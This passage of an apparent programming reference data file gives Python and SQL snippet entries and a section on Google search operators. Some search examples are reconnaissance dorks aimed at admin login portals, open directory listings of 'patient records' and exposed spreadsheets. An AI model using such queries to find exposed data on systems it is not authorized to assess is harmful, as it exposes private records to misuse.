 desc:"The key parameter takes a function applied to each item to produce the value it's sorted by — the items themselves aren't changed, only the comparison. key=len sorts by length, key=str.lower sorts text case-insensitively, and a lambda lets you sort by any field. Sorting is stable, so items with equal keys keep their original relative order.",
 code:{py:`words = ["banana", "kiwi", "apple"]
print(sorted(words, key=len))          # by length
print(sorted(words, key=str.lower))    # case-insensitive`}},
{id:"py-sort-dict", cat:"Python Examples", title:"Sorting · Sorting a dictionary",
 level:"intermediate", example_output:"['Ana', 'Kim', 'Sam']\n[('Ana', 95), ('Sam', 88), ('Kim', 72)]",
 desc:"Sorting a dict directly (sorted(scores)) sorts its keys, giving a plain list of keys in order. To sort by value, sort the items() pairs with a key that picks the value — key=lambda kv: kv[1] — optionally reversed for highest-first. This 'sort a dictionary by value' recipe is a classic; the pattern is: turn it into items(), then sort with a key.",
 code:{py:`scores = {"Sam": 88, "Ana": 95, "Kim": 72}
print(sorted(scores))          # keys: ['Ana','Kim','Sam']
print(sorted(scores.items(), key=lambda kv: kv[1], reverse=True))`}},
{id:"py-sort-tiebreak", cat:"Python Examples", title:"Sorting · Breaking ties (secondary sort)",
 level:"intermediate", example_output:"[('Kim', 25), ('Ana', 30), ('Sam', 30)]",
 desc:"To sort by more than one criterion, return a tuple from the key: Python compares tuples field by field, so (age, name) sorts by age first and uses name only to break ties. Order the fields by priority. To mix directions (age descending, name ascending) negate a numeric field, or sort in stable passes from least to most significant.",
 code:{py:`people = [("Sam", 30), ("Ana", 30), ("Kim", 25)]
# sort by age, then name for ties:
print(sorted(people, key=lambda p: (p[1], p[0])))`}},

{id:"py-nest-complex-items", cat:"Python Examples", title:"Nested data · Lists with complex items",
 level:"intermediate", example_output:"Sam avg: 87.5\nAna avg: 82.5",
 desc:"Lists can hold anything, including other lists — here each item is a [name, grades] pair where grades is itself a list. Unpacking in the loop (for name, grades in students) names the parts, then you compute over the inner list. This 'list of records' shape is everywhere; when the structure gets deep, unpacking keeps the code readable.",
 code:{py:`students = [
    ["Sam", [90, 85]],
    ["Ana", [70, 95]],
]
for name, grades in students:
    print(name, "avg:", sum(grades) / len(grades))`}},
{id:"py-nest-dicts", cat:"Python Examples", title:"Nested data · Nested dictionaries",
 level:"intermediate", example_output:"30\ndev",
 desc:"Values in a dict can themselves be dicts (or lists), so you can model structured records and drill in by chaining keys: users['ana']['age'] reads the age inside ana's record, and adding [1] indexes into the roles list. Each bracket goes one level deeper. Guard against missing pieces with .get() at each level, since a wrong key anywhere raises KeyError.",
 code:{py:`users = {
    "sam": {"age": 42, "roles": ["admin"]},
    "ana": {"age": 30, "roles": ["user", "dev"]},
}
print(users["ana"]["age"])          # 30
print(users["ana"]["roles"][1])     # 'dev'`}},
{id:"py-nest-json", cat:"Python Examples", title:"Nested data · Processing JSON results",
 level:"intermediate", example_output:"Sam\npy\n{\"name\": \"Sam\", \"langs\": [\"py\", \"js\"], \"active\": true}",
 desc:"JSON is the standard text format for data on the web, and it maps cleanly onto Python's nested dicts and lists. json.loads(text) parses a JSON string into those structures (JSON's true/false/null become Python True/False/None), after which you navigate with the same key/index chaining. json.dumps(obj) does the reverse — the pair you'll use whenever you talk to an API.",
 code:{py:`import json
text = '{"name": "Sam", "langs": ["py", "js"], "active": true}'
data = json.loads(text)             # JSON -> Python
print(data["name"])                 # Sam
print(data["langs"][0])             # py
print(json.dumps(data))             # back to a JSON string`}},
{id:"py-nest-iter", cat:"Python Examples", title:"Nested data · Nested iteration",
 level:"beginner", example_output:"1 2 3 \n4 5 6 ",
 desc:"A grid or matrix is naturally a list of lists, and you walk it with nested loops: the outer loop takes one row, the inner loop visits each value in that row. The end=' ' keeps a row on one line, and the bare print() after the inner loop drops to the next line. The same two-level pattern processes tables, boards, and pixel arrays.",
 code:{py:`matrix = [[1, 2, 3], [4, 5, 6]]
for row in matrix:
    for value in row:
        print(value, end=" ")
    print()`}},
{id:"py-nest-copy", cat:"Python Examples", title:"Nested data · Deep vs. shallow copies",
 level:"intermediate", example_output:"[[99, 2], [3, 4]]\n[[1, 2], [3, 4]]",
 desc:"With nested data, copy depth matters. A shallow copy (a[:], list(a), .copy()) makes a new outer list but the inner lists are still shared — so editing shallow[0][0] also changes the original. copy.deepcopy() recursively duplicates everything, giving a fully independent structure. Rule of thumb: shallow is fine for flat data; use deepcopy when nested objects will be modified.",
 code:{py:`import copy
a = [[1, 2], [3, 4]]
shallow = a[:]                 # inner lists still shared
shallow[0][0] = 99
print(a)                       # [[99, 2], [3, 4]]  <- affected
b = [[1, 2], [3, 4]]
deep = copy.deepcopy(b)        # fully independent
deep[0][0] = 99
print(b)                       # [[1, 2], [3, 4]]  <- safe`}},

{id:"py-test-assert", cat:"Python Examples", title:"Testing · Test cases (assert)",
 level:"intermediate", example_output:"all tests passed",
 desc:"assert checks that a condition is True and does nothing if it is; if it's False it raises AssertionError and stops the program. It's the simplest form of a test — state what you expect (double(2) == 4) and let Python verify it. Note assertions can be stripped when Python runs with -O, so use them for tests and internal sanity checks, not for validating user input.",
 code:{py:`def double(x):
    return x * 2
assert double(2) == 4      # passes silently
assert double(0) == 0
print("all tests passed")`}},
{id:"py-test-datatype", cat:"Python Examples", title:"Testing · Checking data-type assumptions",
 level:"intermediate", example_output:"4.0",
 desc:"A good check confirms not just the value but that it has the type you expect. isinstance(result, float) asserts the average came back as a float — catching a bug if some code path returned an int or a string instead. isinstance is the right tool for type checks (it also accepts subclasses), and pairing it with assert documents your assumptions in code.",
 code:{py:`def average(nums):
    return sum(nums) / len(nums)
result = average([2, 4, 6])
assert isinstance(result, float)
print(result)`}},
{id:"py-test-other", cat:"Python Examples", title:"Testing · Checking other assumptions",
 level:"intermediate", example_output:"ok",
 desc:"Beyond specific values, assert invariants — properties that must always hold. clamp should keep its result within 0..100 no matter the input, so 'assert 0 <= clamp(37) <= 100' checks that rule directly. Testing invariants catches whole classes of bugs at once, and they double as executable documentation of what the function guarantees.",
 code:{py:`def clamp(x):
    return max(0, min(100, x))
assert clamp(150) == 100
assert clamp(-5) == 0
assert 0 <= clamp(37) <= 100       # invariant holds
print("ok")`}},
{id:"py-test-conditionals", cat:"Python Examples", title:"Testing · Testing conditionals",
 level:"intermediate", example_output:"branches covered",
 desc:"When a function branches, make sure every path is exercised: for sign() that means one test each for positive, negative, and zero. Untested branches are where bugs hide, because the code 'works' until the missed case shows up. A quick checklist per function: is there a test that reaches each return?",
 code:{py:`def sign(n):
    if n > 0: return "pos"
    elif n < 0: return "neg"
    else: return "zero"
assert sign(5) == "pos"
assert sign(-5) == "neg"
assert sign(0) == "zero"
print("branches covered")`}},
{id:"py-test-loops", cat:"Python Examples", title:"Testing · Testing loops",
 level:"intermediate", example_output:"loop tests passed",
 desc:"Loops deserve edge-case tests: the empty input (does it handle zero items?), the 'none match' case, and a 'some match' case. count_evens is checked against [], [1,3], and [2,4,5]. Empty and boundary inputs are the usual culprits for off-by-one and initialization bugs, so test them deliberately rather than assuming the happy path covers everything.",
 code:{py:`def count_evens(nums):
    c = 0
    for n in nums:
        if n % 2 == 0: c += 1
    return c
assert count_evens([]) == 0            # empty
assert count_evens([1, 3]) == 0        # none
assert count_evens([2, 4, 5]) == 2     # some
print("loop tests passed")`}},
{id:"py-test-return", cat:"Python Examples", title:"Testing · Return value tests",
 level:"intermediate", example_output:"return values verified",
 desc:"The most basic test asserts what a function returns for a handful of representative inputs — a normal case, an edge (adding to make 0), and a boundary. Testing several inputs, not just one, guards against a function that happens to be right for a single value but wrong in general. Keep the expected results obvious so the test itself is easy to trust.",
 code:{py:`def add(a, b):
    return a + b
assert add(2, 3) == 5
assert add(-1, 1) == 0
assert add(0, 0) == 0
print("return values verified")`}},
{id:"py-test-sideeffect", cat:"Python Examples", title:"Testing · Side effect tests",
 level:"intermediate", example_output:"side effect verified",
 desc:"Some functions don't return a useful value; their job is a side effect, like mutating a list. To test those, perform the action and then assert the state changed as intended (data == [1, 2, 0]). The pattern is arrange-act-assert: set up the input, call the function, then check what it did to the world.",
 code:{py:`def append_zero(lst):
    lst.append(0)
data = [1, 2]
append_zero(data)
assert data == [1, 2, 0]
print("side effect verified")`}},
{id:"py-test-optional", cat:"Python Examples", title:"Testing · Testing optional parameters",
 level:"intermediate", example_output:"optional params verified",
 desc:"A function with a default parameter really has two behaviours to test: the default path (greet('Sam') uses 'Hello') and the overridden path (passing 'Hi'). Testing only one leaves half the logic unchecked. Whenever a parameter is optional or a flag toggles behaviour, write a test for each setting.",
 code:{py:`def greet(name, greeting="Hello"):
    return f"{greeting}, {name}"
assert greet("Sam") == "Hello, Sam"          # default
assert greet("Sam", "Hi") == "Hi, Sam"       # override
print("optional params verified")`}},

{id:"py-exc-intro", cat:"Python Examples", title:"Exceptions · Exceptions",
 level:"intermediate", example_output:"that index doesn't exist",
 desc:"An exception is Python's way of signalling that something went wrong — it interrupts the normal flow and travels up looking for a handler. Wrapping risky code in try and pairing it with an except clause for the expected error lets you respond gracefully instead of crashing. Catch specific types (IndexError here) rather than everything, so you don't accidentally hide unrelated bugs.",
 code:{py:`nums = [1, 2, 3]
try:
    print(nums[10])
except IndexError:
    print("that index doesn't exist")`}},
{id:"py-exc-flow", cat:"Python Examples", title:"Exceptions · try/except flow of control",
 level:"intermediate", example_output:"caught it\nfinally always runs",
 desc:"try/except/finally structures error handling. The try block runs until something raises; if a matching except is found, control jumps there (the rest of the try is skipped); the optional finally block runs no matter what — success, handled error, or even an unhandled one. Use finally for cleanup that must happen (closing resources), though 'with' often handles that for you.",
 code:{py:`try:
    x = int("not a number")
    print("this line is skipped")
except ValueError:
    print("caught it")
finally:
    print("finally always runs")`}},
{id:"py-exc-raise", cat:"Python Examples", title:"Exceptions · Raising and catching errors (raise)",
 level:"intermediate", example_output:"error: insufficient funds",
 desc:"You can raise exceptions yourself to signal that a function can't proceed — raise ValueError('insufficient funds') stops execution and hands a descriptive error to the caller. That's cleaner than returning a special error code, because the caller must deal with it. Pick the most fitting built-in type and include a helpful message; 'except ... as e' captures it for inspection.",
 code:{py:`def withdraw(balance, amount):
    if amount > balance:
        raise ValueError("insufficient funds")
    return balance - amount
try:
    withdraw(50, 100)
except ValueError as e:
    print("error:", e)`}},
{id:"py-exc-standard", cat:"Python Examples", title:"Exceptions · Standard exceptions",
 level:"intermediate", example_output:"ZeroDivisionError -> division by zero\nValueError -> invalid literal for int() with base 10: 'x'\nIndexError -> list index out of range\nNameError -> name 'undefined_name' is not defined",
 desc:"Python has a family of built-in exception types, each naming a category of problem: ZeroDivisionError, ValueError (right type, bad value), IndexError (out-of-range access), NameError (undefined name), plus KeyError, TypeError, and more. Knowing them helps you read tracebacks and catch precisely the errors you expect. type(e).__name__ pulls the class name from a caught exception.",
 code:{py:`for call in ["1/0", "int('x')", "[][0]", "undefined_name"]:
    try:
        eval(call)
    except Exception as e:
        print(type(e).__name__, "->", e)
# ZeroDivisionError, ValueError, IndexError, NameError`}},

{id:"py-cls-define", cat:"Python Examples", title:"Classes · User-defined classes",
 level:"intermediate", example_output:"<class '__main__.Dog'>",
 desc:"A class defines a brand-new type — a blueprint for objects that bundle data and behaviour together. Writing 'class Dog:' creates the type, and calling it like a function, Dog(), makes an instance. Even this empty class is a real type: type(d) reports it. Classes let you model the 'things' in your program (a Dog, an Account, a Point) instead of juggling loose variables.",
 code:{py:`class Dog:
    pass              # an empty class (a new type)
d = Dog()             # create an instance
print(type(d))        # <class '__main__.Dog'>`}},
{id:"py-cls-init", cat:"Python Examples", title:"Classes · Constructor / parameters (init)",
 level:"intermediate", example_output:"3 4",
 desc:"__init__ is the constructor — Python runs it automatically when you create an instance, and its job is to set up that object's initial data. The first parameter, self, is the new instance; assigning self.x = x stores a value on it. So Point(3, 4) calls __init__ with x=3, y=4, giving each Point its own x and y. Almost every useful class starts with an __init__.",
 code:{py:`class Point:
    def __init__(self, x, y):   # runs when you create an instance
        self.x = x
        self.y = y
p = Point(3, 4)
print(p.x, p.y)                 # 3 4`}},
{id:"py-cls-methods", cat:"Python Examples", title:"Classes · Adding methods",
 level:"intermediate", example_output:"12.56636",
 desc:"A method is a function defined inside a class; it always takes self first — the instance it's called on — so c.area() runs area with self = c and can read c's data (self.r). Methods are how objects act on their own state. You write the self parameter in the definition, but don't pass it explicitly; Python supplies whatever is before the dot.",
 code:{py:`class Circle:
    def __init__(self, r):
        self.r = r
    def area(self):
        return 3.14159 * self.r ** 2
c = Circle(2)
print(c.area())                 # 12.566...`}},
{id:"py-cls-obj-args", cat:"Python Examples", title:"Classes · Objects as arguments/parameters",
 level:"intermediate", example_output:"5.0",
 desc:"Instances are ordinary values, so you can pass them into functions, store them in lists, and return them — just like ints or strings. Here distance takes two Point objects and reads their attributes to compute the result. This is a key benefit of classes: one object carries all its related data, so you pass a single thing around instead of many loose variables.",
 code:{py:`class Point:
    def __init__(self, x, y):
        self.x, self.y = x, y
def distance(a, b):
    return ((a.x - b.x)**2 + (a.y - b.y)**2) ** 0.5
print(distance(Point(0, 0), Point(3, 4)))   # 5.0`}},
{id:"py-cls-str", cat:"Python Examples", title:"Classes · Converting an object to a string (str)",
 level:"intermediate", example_output:"(3, 4)",
 desc:"By default, printing an object shows something unhelpful like <__main__.Point object at 0x...>. Defining __str__ controls the human-readable form: print() and str() call it, so a Point can display as (3, 4). It must return a string. (Its cousin __repr__ gives the developer-facing form used at the prompt and inside containers; define it too for good debugging output.)",
 code:{py:`class Point:
    def __init__(self, x, y):
        self.x, self.y = x, y
    def __str__(self):
        return f"({self.x}, {self.y})"
print(Point(3, 4))                     # (3, 4)`}},
{id:"py-cls-return-instance", cat:"Python Examples", title:"Classes · Instances as return values",
 level:"intermediate", example_output:"(2.0, 3.0)",
 desc:"A function or method can build and return a new object — midpoint constructs a fresh Point from two others and hands it back. This is common with 'value' types: operations produce new instances rather than mutating existing ones. Because Point defines __str__, the returned object prints nicely. Returning objects lets you chain and compose operations naturally.",
 code:{py:`class Point:
    def __init__(self, x, y):
        self.x, self.y = x, y
    def __str__(self):
        return f"({self.x}, {self.y})"
def midpoint(a, b):
    return Point((a.x + b.x) / 2, (a.y + b.y) / 2)
print(midpoint(Point(0, 0), Point(4, 6)))   # (2.0, 3.0)`}},
{id:"py-cls-sort-instances", cat:"Python Examples", title:"Classes · Sorting lists of instances",
 level:"intermediate", example_output:"[Ana(30), Sam(42)]",
 desc:"To sort a list of objects, give sorted() a key that pulls the attribute to compare — key=lambda p: p.age sorts people by age. The objects aren't changed, only ordered. Defining __repr__ makes the printed list readable (Ana(30) instead of an address). For repeated sorting, operator.attrgetter('age') is a faster, clearer key.",
 code:{py:`class Person:
    def __init__(self, name, age):
        self.name, self.age = name, age
    def __repr__(self):
        return f"{self.name}({self.age})"
people = [Person("Sam", 42), Person("Ana", 30)]
print(sorted(people, key=lambda p: p.age))    # by age`}},
{id:"py-cls-class-vs-instance", cat:"Python Examples", title:"Classes · Class variables vs. instance variables",
 level:"intermediate", example_output:"Canis familiaris Canis familiaris\nRex Fido",
 desc:"A class variable is defined in the class body and shared by every instance (all Dogs have the same species). An instance variable is assigned on self (usually in __init__) and is unique to each object (each Dog has its own name). You read them the same way, but note: assigning through an instance creates an instance variable that shadows the class one rather than changing the shared value.",
 code:{py:`class Dog:
    species = "Canis familiaris"     # class variable (shared)
    def __init__(self, name):
        self.name = name             # instance variable (per object)
a, b = Dog("Rex"), Dog("Fido")
print(a.species, b.species)          # shared value
print(a.name, b.name)                # different`}},
{id:"py-cls-private", cat:"Python Examples", title:"Classes · Public and private instance variables",
 level:"intermediate", example_output:"150",
 desc:"Python has no truly private attributes — instead there's a convention. A single leading underscore (self._balance) signals 'internal; don't touch from outside', while plain names are public API. Nothing enforces it, but well-behaved code respects it, working through methods like deposit() rather than poking _balance directly. (A double underscore triggers name-mangling, a stronger but rarely-needed measure.)",
 code:{py:`class Account:
    def __init__(self, balance):
        self.owner = "Sam"       # public by convention
        self._balance = balance  # _leading underscore = internal
    def deposit(self, amt):
        self._balance += amt
        return self._balance
acct = Account(100)
print(acct.deposit(50))          # 150`}},
{id:"py-cls-test", cat:"Python Examples", title:"Classes · Testing classes",
 level:"intermediate", example_output:"class tests passed",
 desc:"Testing a class means checking three things: its initial state after construction (c.n == 0), what its methods return (c.bump() == 1), and how they change state (c.n becomes 1). Create an instance, then assert your way through a small scenario. This arrange-act-assert flow scales up to real frameworks like unittest and pytest, which organize many such checks.",
 code:{py:`class Counter:
    def __init__(self):
        self.n = 0
    def bump(self):
        self.n += 1
        return self.n
c = Counter()
assert c.n == 0                  # initial state
assert c.bump() == 1             # method return
assert c.n == 1                  # state changed
print("class tests passed")`}},
{id:"py-cls-decorator", cat:"Python Examples", title:"Classes · Class decorators (property/staticmethod)",
 level:"advanced", example_output:"212.0 0",
 desc:"Decorators customize how methods behave. @property turns a method into a computed attribute — you read t.fahrenheit with no parentheses and it runs the method behind the scenes (great for derived values). @staticmethod defines a function that lives on the class but takes no self, for class-related utilities that don't need an instance (Temp.freezing()). Both make a class's interface cleaner.",
 code:{py:`class Temp:
    def __init__(self, c):
        self._c = c
    @property                     # access like an attribute, no ()
    def fahrenheit(self):
        return self._c * 9 / 5 + 32
    @staticmethod                 # utility on the class, no self
    def freezing():
        return 0
t = Temp(100)
print(t.fahrenheit, Temp.freezing())   # 212.0 0`}},

{id:"py-inh-intro", cat:"Python Examples", title:"Inheritance · Class inheritance",
 level:"intermediate", example_output:"breathing",
 desc:"Inheritance lets one class build on another. Writing 'class Dog(Animal):' makes Dog a subclass of Animal, so it automatically gains all of Animal's methods — Dog().breathe() works even though Dog defines nothing itself. This models 'is-a' relationships (a Dog is an Animal) and avoids repeating shared behaviour across related classes.",
 code:{py:`class Animal:
    def breathe(self):
        print("breathing")
class Dog(Animal):        # Dog inherits from Animal
    pass
Dog().breathe()           # inherited method works`}},
{id:"py-inh-subclass", cat:"Python Examples", title:"Inheritance · Defining a subclass",
 level:"intermediate", example_output:"square 4",
 desc:"A subclass usually adds to its parent rather than just inheriting. Square defines its own __init__ to store a side, but first calls super().__init__('square') to run the parent's setup so the inherited name is initialized too. The pattern is: call super().__init__(...) first, then add the subclass's own state. Skipping that super call is a common bug that leaves parent attributes unset.",
 code:{py:`class Shape:
    def __init__(self, name):
        self.name = name
class Square(Shape):
    def __init__(self, side):
        super().__init__("square")
        self.side = side
s = Square(4)
print(s.name, s.side)        # square 4`}},
{id:"py-inh-lookup", cat:"Python Examples", title:"Inheritance · Attribute lookup order",
 level:"intermediate", example_output:"from A\non b",
 desc:"When you access an attribute, Python searches in order: the instance itself, then its class, then each parent up the chain — returning the first match. So b.x finds x on the parent A. Assigning b.x = 'on b' creates an instance attribute that shadows the class one for that object only. This lookup order (the MRO) is also how inherited methods and overrides are resolved.",
 code:{py:`class A:
    x = "from A"
class B(A):
    pass
b = B()
print(b.x)         # 'from A'  (found on parent A)
b.x = "on b"       # instance attribute shadows the class one
print(b.x)         # 'on b'`}},
{id:"py-inh-override", cat:"Python Examples", title:"Inheritance · Overriding methods",
 level:"intermediate", example_output:"... meow",
 desc:"A subclass can override a method by defining one with the same name — Cat.speak replaces Animal.speak for Cat instances, while Animal itself is unchanged. Because Python looks up methods on the actual object's class first, calling speak() on a Cat runs the Cat version. Overriding is how subclasses specialize shared behaviour (every Animal speaks, but each kind speaks differently).",
 code:{py:`class Animal:
    def speak(self):
        return "..."
class Cat(Animal):
    def speak(self):           # override
        return "meow"
print(Animal().speak(), Cat().speak())   # ... meow`}},
{id:"py-inh-super", cat:"Python Examples", title:"Inheritance · Invoking the parent method (super)",
 level:"advanced", example_output:"LOG: hi\n  (also handled here)",
 desc:"When you override a method but still want the parent's behaviour, call it with super(). Here TimeLogger.log runs the base Logger.log via super().log(msg) and then adds its own step — extending rather than fully replacing. This 'do the parent's work, then a bit more' pattern is very common, especially in __init__, and super() finds the right parent automatically, even with multiple inheritance.",
 code:{py:`class Logger:
    def log(self, msg):
        print("LOG:", msg)
class TimeLogger(Logger):
    def log(self, msg):
        super().log(msg)           # call parent's version
        print("  (also handled here)")
TimeLogger().log("hi")`}},
{id:"py-inh-multiple", cat:"Python Examples", title:"Inheritance · Multiple inheritance",
 level:"advanced", example_output:"swim fly",
 desc:"A class can inherit from several parents at once — Duck(Swimmer, Flyer) gains both move() and fly(). This mixes capabilities from multiple sources (often called mixins). When two parents define the same name, Python resolves it using the method resolution order (left to right, depth considered). Multiple inheritance is powerful but can get confusing, so keep the hierarchy shallow and responsibilities clear.",
 code:{py:`class Swimmer:
    def move(self): return "swim"
class Flyer:
    def fly(self): return "fly"
class Duck(Swimmer, Flyer):        # inherits from both
    pass
d = Duck()
print(d.move(), d.fly())           # swim fly`}},

{id:"py-fp-map", cat:"Python Examples", title:"Functional · map",
 level:"intermediate", example_output:"[1, 4, 9, 16]\n['1', '2', '3', '4']",
 desc:"map(func, iterable) applies func to every item, yielding a new iterable of results — a transform with no explicit loop. Here it squares each number, then converts each to a string. map is lazy (it produces items on demand), so wrap it in list() to see them. A list comprehension often reads more clearly, but map shines when you already have a named function to apply.",
 code:{py:`nums = [1, 2, 3, 4]
squared = list(map(lambda x: x * x, nums))    # apply to each
print(squared)                                 # [1, 4, 9, 16]
print(list(map(str, nums)))                    # ['1','2','3','4']`}},
{id:"py-fp-filter", cat:"Python Examples", title:"Functional · filter",
 level:"intermediate", example_output:"[2, 4, 6, 8, 10]",
 desc:"filter(func, iterable) keeps only the items for which func returns True, dropping the rest — a selection without a loop-and-if. Here it keeps the even numbers. Like map it's lazy, so list() realizes it. And like map, a comprehension with an if ([x for x in nums if x % 2 == 0]) expresses the same idea, which many find more readable.",
 code:{py:`nums = range(1, 11)
evens = list(filter(lambda x: x % 2 == 0, nums))
print(evens)                                     # [2, 4, 6, 8, 10]`}},
{id:"py-fp-comprehension", cat:"Python Examples", title:"Functional · List comprehensions",
 level:"intermediate", example_output:"[0, 1, 4, 9, 16]\n[0, 2, 4, 6, 8]\n['A', 'B', 'C']",
 desc:"A list comprehension builds a list in one expression: [expression for item in iterable if condition]. It folds map (the expression transforms each item) and filter (the optional if keeps only some) into one readable line, and it's the most idiomatic way to construct lists in Python. Dict and set comprehensions follow the same shape. Keep each to one clear transform; nest sparingly.",
 code:{py:`print([x * x for x in range(5)])              # [0, 1, 4, 9, 16]
print([x for x in range(10) if x % 2 == 0])   # evens
print([c.upper() for c in "abc"])             # ['A', 'B', 'C']`}},
{id:"py-fp-zip", cat:"Python Examples", title:"Functional · zip",
 level:"intermediate", example_output:"Sam 42\nAna 30\nKim 25\n{'Sam': 42, 'Ana': 30, 'Kim': 25}",
 desc:"zip() pairs up items from several iterables by position — the first of each, then the second, and so on — yielding tuples you can unpack in a loop. It's the clean way to walk two related lists together (names with ages) instead of indexing. zip stops at the shortest input, and wrapping it in dict() turns paired keys and values straight into a dictionary.",
 code:{py:`names = ["Sam", "Ana", "Kim"]
ages = [42, 30, 25]
for name, age in zip(names, ages):     # pair them up
    print(name, age)
print(dict(zip(names, ages)))          # {'Sam': 42, 'Ana': 30, 'Kim': 25}`}},

/* ================= GOOGLE DORKS ================= */

{id:"dork-inurl", cat:"Google Dorks", title:"inurl:", desc:"Require a term to appear in the page's URL — good for admin paths, login portals, and specific directories.",
 code:{dork:`inurl:admin login portal`}},
{id:"dork-site", cat:"Google Dorks", title:"site:", desc:"Limit results to a single domain or TLD.",
 code:{dork:`site:microsoft.com windows xp end of life`}},
{id:"dork-filetype", cat:"Google Dorks", title:"filetype: / ext:", desc:"Return only one file type. filetype: and ext: behave the same.",
 code:{dork:`filetype:pdf nasa moon landing`}},
{id:"dork-allinurl", cat:"Google Dorks", title:"allinurl:", desc:"Require every following word to appear in the URL (like stacking inurl:).",
 code:{dork:`allinurl:blog wordpress admin`}},
{id:"dork-intext", cat:"Google Dorks", title:"intext: / allintext:", desc:"Match words in the page body; allintext: requires all of the listed words.",
 code:{dork:`intext:"index of /htdocs" patient records`}},
{id:"dork-related", cat:"Google Dorks", title:"related:", desc:"Find sites similar to a given domain. Google's coverage of this operator is now limited.",
 code:{dork:`related:sans.org`}},
{id:"dork-info", cat:"Google Dorks", title:"info:", desc:"Once showed what Google indexed about a URL. Note: Google retired info: (~2019) and cache: (2024) — use the Wayback Machine (web.archive.org) for cached copies.",
 code:{dork:`info:usgs.gov`}},
{id:"dork-link", cat:"Google Dorks", title:"link:", desc:"Historically listed pages linking to a URL. Note: Google removed the link: operator (~2017); use Search Console or a backlink tool instead.",
 code:{dork:`link:example.com/report.pdf`}},
{id:"dork-exact", cat:"Google Dorks", title:`"exact phrase"`, desc:"Double quotes match a phrase verbatim and in order.",
 code:{dork:`"malware hunting"`}},
{id:"dork-plus", cat:"Google Dorks", title:"+word (force exact)", desc:"Force a term with no synonyms or stemming. Google removed the + operator in 2011 — quote the single word instead.",
 code:{dork:`malware "hunter"`}},
{id:"dork-exclude", cat:"Google Dorks", title:"-word (exclude)", desc:"A leading minus drops results (or query terms) containing that word. No space between - and the word.",
 code:{dork:`advanced malware hunting -beginner -introduction`}},
{id:"dork-wildcard", cat:"Google Dorks", title:`"word * word"`, desc:"Inside a quoted phrase, * is a single-word wildcard — matches anything between the two words.",
 code:{dork:`"next * firewalls"`}},
{id:"dork-or", cat:"Google Dorks", title:"OR / |", desc:"Match either term. Use uppercase OR or the pipe character | between terms.",
 code:{dork:`locky OR ransomware`}},
{id:"dork-and", cat:"Google Dorks", title:"AND", desc:"Match both terms. Google already ANDs separate words by default; explicit AND also works. The & character is not a Google operator.",
 code:{dork:`cissp AND certification`}},
{id:"dork-combo", cat:"Google Dorks", title:"Chaining operators (power search)", desc:"Stack operators for precise OSINT — e.g. surface exposed spreadsheets on a domain. Use only against systems you are authorized to assess.",
 code:{dork:`intitle:"index of" (xls | xlsx) intext:budget site:example.com`}},

/* ================= SQL ================= */

/* ---------- querying a table ---------- */
{id:"sql-select-cols", cat:"SQL", title:"SELECT columns", level:"beginner", example_output:"-- employees: SELECT name, dept FROM employees;\nname  dept\nAda   Eng\nSam   Ops\nKim   Eng", desc:"SELECT lists the columns you want back, in the order you name them, from the table after FROM. Naming columns explicitly (rather than SELECT *) returns only the data you need, documents intent, and is more stable if the table later gains columns. End statements with a semicolon. The result is a table of rows limited to those columns.",
 code:{sql:`SELECT c1, c2 FROM t;`}},
{id:"sql-select-all", cat:"SQL", title:"SELECT * (all columns)", level:"beginner", example_output:"-- SELECT * FROM employees;\nid  name  dept  salary\n1   Ada   Eng   95000\n2   Sam   Ops   72000", desc:"SELECT * returns every column of every row — a quick way to eyeball a table's full contents. It's handy at the prompt while exploring, but avoid it in application code: it fetches columns you may not need, breaks when the schema changes, and hides which columns you actually rely on. Prefer an explicit column list in anything you'll keep.",
 code:{sql:`SELECT * FROM t;`}},
{id:"sql-where", cat:"SQL", title:"WHERE (filter rows)", level:"beginner", example_output:"-- SELECT name, salary FROM employees WHERE salary > 80000;\nname  salary\nAda   95000\nKim   88000", desc:"WHERE filters rows, keeping only those for which the condition is true — it runs before grouping and ordering. Conditions combine comparisons (=, <>, >, <, >=, <=) with AND, OR, and NOT, and can use LIKE, IN, BETWEEN, and IS NULL. Note SQL uses a single = for equality, and comparing anything to NULL yields UNKNOWN, so those rows are excluded.",
 code:{sql:`SELECT c1, c2 FROM t
WHERE condition;`}},
{id:"sql-distinct", cat:"SQL", title:"SELECT DISTINCT", level:"beginner", example_output:"-- SELECT DISTINCT dept FROM employees;\ndept\nEng\nOps\nSales", desc:"SELECT DISTINCT removes duplicate rows from the result, so you get each unique combination of the selected columns once. It's the go-to for 'what are the distinct values here?' (e.g. the set of departments). DISTINCT applies to all selected columns together, and it can be costly on large results since the database must dedupe — so select only the columns you need.",
 code:{sql:`SELECT DISTINCT c1 FROM t
WHERE condition;`}},
{id:"sql-orderby", cat:"SQL", title:"ORDER BY", level:"beginner", example_output:"-- SELECT name, salary FROM employees ORDER BY salary DESC;\nname  salary\nAda   95000\nKim   88000\nSam   72000", desc:"ORDER BY sorts the result by one or more columns. ASC (ascending) is the default; DESC reverses it, and you can set the direction per column (ORDER BY dept ASC, salary DESC). Sorting happens last — after WHERE and GROUP BY — so you can order by computed or aggregated columns. Without ORDER BY, row order is not guaranteed, so never rely on 'natural' order.",
 code:{sql:`SELECT c1, c2 FROM t
ORDER BY c1 ASC;   -- or DESC`}},
{id:"sql-limit", cat:"SQL", title:"LIMIT / OFFSET", level:"beginner", example_output:"-- SELECT name FROM employees ORDER BY name LIMIT 2 OFFSET 1;\nname\nKim\nLee", desc:"LIMIT caps how many rows come back, and OFFSET skips rows first — together they do paging (page 2 of ten-row pages is LIMIT 10 OFFSET 10). Always pair them with ORDER BY, or 'the first n rows' is arbitrary. Dialects differ: LIMIT/OFFSET is MySQL, PostgreSQL, and SQLite; SQL Server and Oracle use the standard OFFSET ... FETCH NEXT n ROWS ONLY.",
 code:{sql:`SELECT c1, c2 FROM t
ORDER BY c1
LIMIT n OFFSET offset;`}},
{id:"sql-groupby", cat:"SQL", title:"GROUP BY (aggregate)", level:"intermediate", example_output:"-- SELECT dept, COUNT(*), AVG(salary) FROM employees GROUP BY dept;\ndept  count  avg\nEng   2      91500\nOps   2      66000", desc:"GROUP BY collapses rows that share the same value(s) in the grouping columns into one group, then applies aggregate functions (COUNT, SUM, AVG, MIN, MAX) to each group. Every column in the SELECT must either appear in the GROUP BY or be wrapped in an aggregate — otherwise it's ambiguous which row's value to show. It runs after WHERE, so filter rows first, then group.",
 code:{sql:`SELECT c1, aggregate(c2)
FROM t
GROUP BY c1;`}},
